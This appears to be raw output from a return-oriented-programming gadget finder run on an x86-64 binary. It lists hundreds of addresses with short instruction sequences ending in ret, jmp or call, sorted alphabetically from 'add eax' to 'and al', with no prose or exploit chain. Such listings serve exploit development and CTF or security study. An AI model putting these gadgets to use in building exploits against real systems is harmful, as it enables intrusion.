0x0000000000431647 : add eax, 0x83480000 ; ret 0x4910
0x0000000000444f71 : add eax, 0x83480000 ; ret 0xe910
0x0000000000431675 : add eax, 0x83480000 ; ret 0xeb10
0x0000000000465c95 : add eax, 0x83ffffef ; ret
0x000000000044a7eb : add eax, 0x8428d48 ; ret
0x0000000000414518 : add eax, 0x8944c689 ; ret 0xeab8
0x000000000045fab3 : add eax, 0x89480000 ; ret 0x2948
0x0000000000498410 : add eax, 0x89490000 ; ret 0x8349
0x0000000000487c18 : add eax, 0x940fc085 ; ret 0x3d
0x0000000000479449 : add eax, 0x9f2 ; cmove rax, rdx ; ret
0x000000000047a859 : add eax, 0xa22 ; cmove rax, rdx ; ret
0x0000000000433d3a : add eax, 0xc0310000 ; ret
0x000000000044a86d : add eax, 0xc428d48 ; ret
0x000000000049b751 : add eax, 0xc46fffa ; cli ; call rsi
0x000000000044b34d : add eax, 0xc478d48 ; ret
0x000000000045bb95 : add eax, 0xe8000003 ; ret 0xfac8
0x000000000045c072 : add eax, 0xe9000000 ; ret
0x0000000000479419 : add eax, 0xee2 ; cmove rax, rdx ; ret
0x0000000000493dba : add eax, 0xf7148948 ; ret
0x000000000043c1a3 : add eax, 0xf7f0ff3 ; ret
0x00000000004960ca : add eax, 0xffff50e9 ; push rbx ; ret
0x0000000000455435 : add eax, 1 ; push rax ; call rbx
0x000000000047b481 : add eax, 1 ; ret
0x000000000047b478 : add eax, 2 ; ret
0x000000000047b491 : add eax, 3 ; ret
0x00000000004617e9 : add eax, dword ptr [0] ; ret
0x000000000045bb96 : add eax, dword ptr [rax] ; add al, ch ; ret 0xfac8
0x0000000000482268 : add eax, dword ptr [rax] ; add bl, dh ; ret
0x0000000000490401 : add eax, dword ptr [rax] ; add byte ptr [rax + 0x74], ah ; adc dword ptr [rcx - 0x7d], ecx ; ret
0x0000000000490a5c : add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x0000000000422eb8 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x0000000000421806 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000040784b : add eax, dword ptr [rax] ; add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000042198a : add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000042668a : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000426850 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000431827 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000445111 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431855 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000456024 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000045116c : add eax, dword ptr [rax] ; add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x000000000047b4d3 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x000000000044eefc : add eax, dword ptr [rax] ; add byte ptr [rbx - 0x50f0fe40], al ; ret 0xf8e9
0x00000000004905d0 : add eax, dword ptr [rax] ; add byte ptr [rcx + 0x348b4cd8], cl ; ret 0xf41
0x000000000046897c : add eax, dword ptr [rax] ; add byte ptr [rcx + 0xf], al ; ret 0xc839
0x0000000000452885 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x00000000004831a6 : add eax, dword ptr [rax] ; add dh, dh ; ret 0x7403
0x0000000000421787 : add eax, dword ptr [rax] ; add dh, dh ; ret 0xf08
0x00000000004756e4 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x0000000000475e2b : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x0000000000475e99 : add eax, dword ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000044ebe0 : add eax, dword ptr [rax] ; pop rbx ; ret
0x0000000000483e6c : add eax, dword ptr [rbp - 0xb8] ; call rax
0x00000000004bb6c9 : add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x000000000047c65a : add eax, dword ptr [rcx + rdx] ; ret
0x00000000004b4af2 : add eax, dword ptr [rdi + 0xe] ; and byte ptr [rdx], al ; imul ecx, dword ptr [rsi], 0x18 ; ret
0x000000000048d893 : add eax, dword ptr [rdx + 8] ; call rax
0x00000000004bb6fd : add eax, dword ptr [rdx] ; cld ; ret
0x00000000004bb731 : add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004b9682 : add eax, dword ptr [rsi + 0xe] ; and byte ptr [rsi + rcx + 0x18], bh ; ret
0x0000000000482ee6 : add eax, dword ptr [rsi] ; call rax
0x00000000004919f6 : add eax, eax ; jmp rax
0x0000000000408b24 : add eax, ebp ; jmp rax
0x0000000000483207 : add eax, ebx ; call rax
0x00000000004540bc : add eax, ebx ; jmp rax
0x0000000000447298 : add eax, ecx ; add rax, rdi ; vzeroupper ; ret
0x00000000004756eb : add eax, ecx ; jmp rax
0x0000000000431c49 : add eax, ecx ; ret
0x00000000004475fd : add eax, ecx ; sub rax, rdx ; vzeroupper ; ret
0x0000000000432176 : add eax, ecx ; vzeroupper ; ret
0x0000000000431c46 : add eax, edi ; add rax, rcx ; ret
0x0000000000432173 : add eax, edi ; add rax, rcx ; vzeroupper ; ret
0x0000000000475d1b : add eax, edi ; jmp rax
0x0000000000475fef : add eax, edi ; mov rdx, r8 ; jmp 0x475fc3
0x0000000000431e74 : add eax, edi ; ret
0x000000000048be80 : add eax, edi ; sub rax, r8 ; ret
0x00000000004476b5 : add eax, edi ; sub rax, rdx ; vzeroupper ; ret
0x000000000044d65a : add eax, edi ; sub rax, rsi ; ret
0x00000000004322ea : add eax, edi ; vzeroupper ; ret
0x00000000004088ba : add eax, edx ; jmp rax
0x00000000004475a6 : add eax, edx ; sub rax, rdi ; ret
0x000000000047b17b : add eax, edx ; sub rax, rdi ; shr rax, 2 ; ret
0x000000000044eb8c : add eax, esi ; jmp rax
0x000000000041ee8d : add eax, esi ; mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x0000000000492c6d : add eax, esp ; jmp rax
0x0000000000469c88 : add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x0000000000482ee2 : add ebx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x000000000049101a : add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x000000000048f250 : add ebx, dword ptr [rbp + 0x41] ; pop rsp ; pop r13 ; ret
0x000000000041d5a1 : add ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004bb6ee : add ebx, dword ptr [rbx + 3] ; ret
0x0000000000454c8f : add ebx, dword ptr [rbx - 0x2d] ; loopne 0x454cf8 ; pop r12 ; ret
0x0000000000489321 : add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x0000000000432a5b : add ebx, eax ; nop dword ptr [rax] ; ret
0x000000000043c363 : add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000044e797 : add ecx, 0x40 ; cmp rdx, rcx ; jne 0x44e78c ; ret
0x0000000000449005 : add ecx, dword ptr [r9 - 0x76b7fcbe] ; clc ; ret
0x000000000045df6d : add ecx, dword ptr [rax + 0x39] ; ret
0x00000000004149ee : add ecx, dword ptr [rax + 1] ; fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x0000000000457dca : add ecx, dword ptr [rax - 0x77] ; and al, 0x50 ; call 0x454028
0x0000000000449009 : add ecx, dword ptr [rax - 0x77] ; clc ; ret
0x0000000000485337 : add ecx, dword ptr [rax - 0x77] ; mov rax, rcx ; ret
0x0000000000456923 : add ecx, dword ptr [rax - 0x77] ; or byte ptr [r15], 0x8e ; ret 1
0x00000000004020d8 : add ecx, dword ptr [rax - 0x77] ; ret 0x4588
0x000000000049272f : add ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004153e1 : add ecx, dword ptr [rbp + rcx*4 + 0x64] ; ret
0x00000000004878fa : add ecx, dword ptr [rbp - 0x77] ; dec byte ptr [rax - 0x7d] ; ret
0x0000000000489df0 : add ecx, dword ptr [rbp - 0x77] ; ret 0x8d48
0x000000000043c0d2 : add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x00000000004bb6ba : add ecx, dword ptr [rbx + 3] ; ret
0x00000000004020ef : add ecx, dword ptr [rbx - 0x76b7fbbd] ; ret 0x4588
0x000000000044ac84 : add ecx, dword ptr [rcx + 0x357890f] ; ret
0x0000000000449006 : add ecx, dword ptr [rcx - 0x76b7fcbe] ; clc ; ret
0x000000000044f89f : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x000000000044f8fd : add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xd284
0x00000000004b3779 : add ecx, dword ptr [rsi + rcx - 0x50] ; add al, byte ptr [rdx] ; ret 0xb00e
0x000000000046cab9 : add ecx, eax ; mov eax, r9d ; ret
0x000000000043436b : add ecx, ebx ; jmp r9
0x0000000000432d02 : add ecx, ebx ; jmp rcx
0x000000000044ebb4 : add ecx, esi ; jmp rcx
0x0000000000494c7e : add edi, dword ptr [rax + 4] ; jne 0x494ca9 ; ret
0x0000000000460fc4 : add edi, ebx ; jmp rdi
0x0000000000434368 : add edi, edx ; add r9, r11 ; jmp r9
0x0000000000413ecc : add edi, edx ; jmp rdi
0x000000000048dd44 : add edx, eax ; jmp 0x48dd52
0x000000000048a052 : add edx, eax ; mov rax, rdx ; pop rbx ; ret
0x000000000049bb21 : add edx, edi ; call rax
0x0000000000413be3 : add edx, edi ; jmp rdx
0x000000000049baa1 : add edx, edi ; jmp rsp
0x000000000046fa58 : add edx, esp ; call qword ptr [r10 + rax*8]
0x000000000045f376 : add esi, dword ptr [rdi + rax - 0xd] ; ret
0x0000000000460ac5 : add esi, eax ; jmp rsi
0x000000000043c283 : add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000044d9b5 : add esi, ebx ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000045008c : add esi, ebx ; ret
0x00000000004257b0 : add esi, ebx ; stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000044ecbe : add esi, edi ; int1 ; pop rbx ; mov eax, eax ; ret
0x0000000000434365 : add esi, edx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x000000000041d0d1 : add esp, 0x10 ; pop rbx ; jmp rax
0x00000000004172d1 : add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004506bf : add esp, 0x10 ; pop rbx ; ret
0x00000000004189d5 : add esp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044d55d : add esp, 0x100 ; sub rax, rdx ; ret
0x00000000004891f8 : add esp, 0x110 ; pop rbx ; ret
0x000000000041455e : add esp, 0x118 ; ret
0x0000000000461b1a : add esp, 0x148 ; ret
0x0000000000420be9 : add esp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000425e9b : add esp, 0x18 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004264b6 : add esp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x0000000000453dda : add esp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000418365 : add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00000000004618d2 : add esp, 0x18 ; ret
0x0000000000427ac0 : add esp, 0x20 ; call 0x4168c9
0x000000000041dbdd : add esp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x000000000041d7bd : add esp, 0x20 ; pop rbx ; jmp rax
0x000000000041dc16 : add esp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000489279 : add esp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d52f : add esp, 0x20 ; pop rbx ; ret
0x000000000044f6e2 : add esp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000407536 : add esp, 0x28 ; ret
0x00000000004561b8 : add esp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048b44f : add esp, 0x30 ; pop rbx ; ret
0x00000000004917e6 : add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000414414 : add esp, 0x38 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041cbde : add esp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000047c511 : add esp, 0x38 ; ret
0x000000000048f07c : add esp, 0x40 ; pop rbx ; ret
0x000000000048878c : add esp, 0x48 ; jmp qword ptr [rax]
0x000000000044fd32 : add esp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000048f163 : add esp, 0x50 ; pop rbx ; ret
0x000000000048871a : add esp, 0x58 ; jmp qword ptr [rax]
0x000000000045028a : add esp, 0x58 ; ret
0x000000000045017c : add esp, 0x68 ; ret
0x000000000047a974 : add esp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000400f5a : add esp, 0x78 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045050f : add esp, 0x78 ; ret
0x000000000046f41e : add esp, 0x80 ; mov eax, edx ; pop rbx ; ret
0x00000000004171ee : add esp, 0x80 ; mov eax, esi ; pop rbx ; ret
0x000000000047bff3 : add esp, 0x80 ; pop rbx ; ret
0x000000000041c4a8 : add esp, 0x80 ; ret
0x000000000045266d : add esp, 0x88 ; pop rbx ; pop rbp ; ret
0x0000000000407702 : add esp, 0x88 ; pop rbx ; ret
0x0000000000407e7f : add esp, 0x98 ; ret
0x000000000047c113 : add esp, 0xa8 ; pop rbx ; pop rbp ; ret
0x000000000045e786 : add esp, 0xb8 ; pop rbx ; pop r12 ; ret
0x0000000000416487 : add esp, 0xd0 ; pop rbx ; ret
0x0000000000416616 : add esp, 0xd8 ; pop rbx ; pop rbp ; ret
0x0000000000401d9c : add esp, 0xd8 ; ret
0x00000000004186df : add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000048680b : add esp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00000000004169ae : add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000452a16 : add esp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x0000000000451ca0 : add esp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x0000000000450edc : add esp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000041d189 : add esp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x000000000048efb9 : add esp, 8 ; movzx eax, al ; neg eax ; ret
0x0000000000401c3a : add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000408513 : add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400418 : add esp, 8 ; ret
0x000000000042a339 : add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00000000004058e2 : add esp, eax ; ret
0x000000000043c362 : add r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c2f2 : add r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c282 : add r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x0000000000431854 : add r8, qword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000043436a : add r9, r11 ; jmp r9
0x000000000045df4e : add r9b, byte ptr [rax + 0x39] ; ret
0x00000000004020ee : add r9d, dword ptr [r11 - 0x76b7fbbd] ; ret 0x4588
0x000000000045df6c : add r9d, dword ptr [rax + 0x39] ; ret
0x000000000046cab8 : add r9d, eax ; mov eax, r9d ; ret
0x000000000047b480 : add rax, 1 ; ret
0x000000000047b477 : add rax, 2 ; ret
0x000000000047b490 : add rax, 3 ; ret
0x00000000004617e8 : add rax, qword ptr [0] ; ret
0x0000000000482ee5 : add rax, qword ptr [r14] ; call rax
0x0000000000483e6b : add rax, qword ptr [rbp - 0xb8] ; call rax
0x000000000048d892 : add rax, qword ptr [rdx + 8] ; call rax
0x00000000004617e7 : add rax, qword ptr fs:[0] ; ret
0x0000000000483206 : add rax, r11 ; call rax
0x0000000000492c6c : add rax, r12 ; jmp rax
0x0000000000408b23 : add rax, r13 ; jmp rax
0x000000000049356d : add rax, r14 ; jmp rax
0x0000000000491c1b : add rax, r15 ; jmp rax
0x00000000004919f5 : add rax, r8 ; jmp rax
0x00000000004931a5 : add rax, r9 ; jmp rax
0x0000000000454133 : add rax, rbp ; jmp rax
0x00000000004540bb : add rax, rbx ; jmp rax
0x0000000000447297 : add rax, rcx ; add rax, rdi ; vzeroupper ; ret
0x00000000004756ea : add rax, rcx ; jmp rax
0x0000000000431c48 : add rax, rcx ; ret
0x00000000004475fc : add rax, rcx ; sub rax, rdx ; vzeroupper ; ret
0x0000000000432175 : add rax, rcx ; vzeroupper ; ret
0x0000000000431c45 : add rax, rdi ; add rax, rcx ; ret
0x0000000000432172 : add rax, rdi ; add rax, rcx ; vzeroupper ; ret
0x0000000000475d1a : add rax, rdi ; jmp rax
0x0000000000431e73 : add rax, rdi ; ret
0x000000000048be7f : add rax, rdi ; sub rax, r8 ; ret
0x00000000004476b4 : add rax, rdi ; sub rax, rdx ; vzeroupper ; ret
0x000000000044d659 : add rax, rdi ; sub rax, rsi ; ret
0x00000000004322e9 : add rax, rdi ; vzeroupper ; ret
0x00000000004088b9 : add rax, rdx ; jmp rax
0x00000000004475a5 : add rax, rdx ; sub rax, rdi ; ret
0x000000000044eb8b : add rax, rsi ; jmp rax
0x0000000000482ee1 : add rbx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x0000000000432d01 : add rcx, r11 ; jmp rcx
0x000000000044ebb3 : add rcx, rsi ; jmp rcx
0x0000000000413ecb : add rdi, r10 ; jmp rdi
0x0000000000460fc3 : add rdi, r11 ; jmp rdi
0x0000000000434367 : add rdi, rdx ; add r9, r11 ; jmp r9
0x000000000046fa57 : add rdx, r12 ; call qword ptr [r10 + rax*8]
0x000000000048a051 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x000000000048dd43 : add rdx, rax ; jmp 0x48dd53
0x0000000000413be2 : add rdx, rdi ; jmp rdx
0x0000000000460ac4 : add rsi, r8 ; jmp rsi
0x000000000041d0d0 : add rsp, 0x10 ; pop rbx ; jmp rax
0x00000000004172d0 : add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004506be : add rsp, 0x10 ; pop rbx ; ret
0x00000000004891f7 : add rsp, 0x110 ; pop rbx ; ret
0x000000000041455d : add rsp, 0x118 ; ret
0x0000000000461b19 : add rsp, 0x148 ; ret
0x0000000000420be8 : add rsp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000425e9a : add rsp, 0x18 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004264b5 : add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x0000000000418364 : add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00000000004618d1 : add rsp, 0x18 ; ret
0x000000000041dbdc : add rsp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x000000000041d7bc : add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000041dc15 : add rsp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000489278 : add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041d52e : add rsp, 0x20 ; pop rbx ; ret
0x0000000000407535 : add rsp, 0x28 ; ret
0x00000000004561b7 : add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048b44e : add rsp, 0x30 ; pop rbx ; ret
0x00000000004917e5 : add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000041cbdd : add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000047c510 : add rsp, 0x38 ; ret
0x000000000048f07b : add rsp, 0x40 ; pop rbx ; ret
0x000000000048878b : add rsp, 0x48 ; jmp qword ptr [rax]
0x000000000048f162 : add rsp, 0x50 ; pop rbx ; ret
0x0000000000488719 : add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000450289 : add rsp, 0x58 ; ret
0x000000000045017b : add rsp, 0x68 ; ret
0x000000000047a973 : add rsp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045050e : add rsp, 0x78 ; ret
0x000000000047bff2 : add rsp, 0x80 ; pop rbx ; ret
0x000000000041c4a7 : add rsp, 0x80 ; ret
0x000000000045266c : add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x0000000000407701 : add rsp, 0x88 ; pop rbx ; ret
0x0000000000407e7e : add rsp, 0x98 ; ret
0x000000000047c112 : add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000000416486 : add rsp, 0xd0 ; pop rbx ; ret
0x0000000000416615 : add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x0000000000401d9b : add rsp, 0xd8 ; ret
0x00000000004186de : add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000048680a : add rsp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00000000004169ad : add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000452a15 : add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x0000000000451c9f : add rsp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x0000000000450edb : add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000041d188 : add rsp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x000000000048efb8 : add rsp, 8 ; movzx eax, al ; neg eax ; ret
0x0000000000408512 : add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400417 : add rsp, 8 ; ret
0x000000000042a338 : add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000042b1a7 : add word ptr [rax], ax ; and ch, 2 ; cmovne rax, rdx ; ret
0x000000000048bf4a : add word ptr [rdx + rax*2], 1 ; ret
0x000000000049b668 : and ah, bl ; stc ; jmp qword ptr [rax]
0x000000000049bee4 : and ah, byte ptr [rdi] ; cli ; jmp qword ptr [rdx + 0x22fffa26]
0x000000000049befc : and ah, byte ptr [rdx + rdi*8] ; jmp qword ptr [rdx + 0x12fffa23]
0x000000000049bef4 : and ah, byte ptr [rip + 0x24a2fffa] ; cli ; jmp qword ptr [rdx]
0x000000000049beec : and ah, byte ptr [rsi] ; cli ; jmp qword ptr [rdx + 0x22fffa25]
0x000000000049b554 : and ah, dl ; stc ; inc dword ptr [rax] ; salc ; stc ; jmp rax
0x00000000004723e1 : and al, 0 ; jmp rax
0x000000000047300a : and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000493e58 : and al, 0x10 ; add rsp, 0x28 ; ret
0x0000000000495a10 : and al, 0x10 ; call r14
0x00000000004512c8 : and al, 0x10 ; call rax
0x00000000004891bb : and al, 0x10 ; call rdx
0x000000000042346c : and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000478c72 : and al, 0x10 ; mov rdi, r12 ; call rbx
0x00000000004957f8 : and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x0000000000407ab5 : and al, 0x18 ; call rax
0x00000000004553b8 : and al, 0x18 ; mov r9, r13 ; call rbx
0x0000000000478b8d : and al, 0x18 ; mov rdi, r12 ; call rbx
0x000000000047ae8f : and al, 0x18 ; mov rdi, rbp ; mov r9, r14 ; call rbx
0x00000000004891b6 : and al, 0x18 ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000407533 : and al, 0x20 ; add rsp, 0x28 ; ret
0x0000000000457b07 : and al, 0x20 ; call r15
0x0000000000459d3e : and al, 0x20 ; call rax
0x000000000047ab50 : and al, 0x20 ; call rbx
0x00000000004579d2 : and al, 0x20 ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00000000004aed04 : and al, 0x26 ; outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x00000000004264b3 : and al, 0x28 ; add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x0000000000457b02 : and al, 0x28 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x0000000000429363 : and al, 0x28 ; mov rdi, rbp ; call rax
0x00000000004583e3 : and al, 0x30 ; call r14
0x00000000004585bb : and al, 0x30 ; call rbx
0x000000000047ad3e : and al, 0x30 ; mov rdi, rbp ; call rbx
0x000000000045983a : and al, 0x38 ; add byte ptr [rsp + rsi - 0xa], dh ; ret
0x00000000004588a5 : and al, 0x38 ; call r12
0x0000000000458edd : and al, 0x38 ; call r14
0x000000000045bea1 : and al, 0x38 ; call r15
0x00000000004580eb : and al, 0x38 ; call rbx
0x000000000047aa28 : and al, 0x38 ; lea rcx, qword ptr [rax + 1] ; call rbx
0x0000000000457df7 : and al, 0x38 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00000000004583de : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00000000004585b6 : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x000000000046df2c : and al, 0x40 ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x000000000045ddbe : and al, 0x40 ; add byte ptr [rdx + rdi*2 - 0xa], dh ; ret
0x000000000045cb7e : and al, 0x40 ; add byte ptr [rsi + rsi*2 - 0xa], dh ; ret
0x0000000000488789 : and al, 0x40 ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000488717 : and al, 0x40 ; add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000045a31c : and al, 0x40 ; call r15
0x000000000045cac8 : and al, 0x40 ; call rbx
0x0000000000459d39 : and al, 0x40 ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x00000000004588a0 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000458ed8 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045be9c : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00000000004580e6 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000048d891 : and al, 0x48 ; add eax, dword ptr [rdx + 8] ; call rax
0x000000000041d0f8 : and al, 0x48 ; add esp, 0x10 ; pop rbx ; jmp rax
0x00000000004918c8 : and al, 0x48 ; add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x00000000004915cc : and al, 0x48 ; add esp, 0x38 ; ret
0x0000000000419dd4 : and al, 0x48 ; mov edi, ebx ; call rax
0x00000000004948fe : and al, 0x48 ; mov edx, dword ptr [rbp] ; call r12
0x000000000045a317 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x000000000045cac3 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00000000004948af : and al, 0x4c ; lea esi, dword ptr [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x0000000000490817 : and al, 0x4c ; mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x00000000004907c5 : and al, 0x4c ; mov esi, esp ; mov edi, ebp ; call rax
0x0000000000457dce : and al, 0x50 ; call 0x454024
0x0000000000457dcd : and al, 0x50 ; call 0x454025
0x000000000040b2c1 : and al, 0x60 ; jmp 0x40ad3c
0x0000000000426d7b : and al, 0x68 ; call rax
0x000000000040a917 : and al, 0x68 ; je 0x40a960 ; xor edi, edi ; call 0x426b88
0x000000000046a5fe : and al, 0x83 ; ret
0x000000000045e47d : and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000041fc63 : and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x000000000040b15c : and al, 0x8c ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x00000000004582fe : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x0000000000498c5b : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004983bb : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x0000000000458d8b : and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x0000000000458780 : and al, 0xa8 ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000045e553 : and al, 0xb0 ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x0000000000493a3b : and al, 0xbf ; add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x00000000004506bc : and al, 0xc ; add rsp, 0x10 ; pop rbx ; ret
0x000000000045063f : and al, 0xc ; jne 0x450610 ; neg eax ; jmp 0x450610
0x000000000045063e : and al, 0xc ; jne 0x450611 ; neg eax ; jmp 0x450611
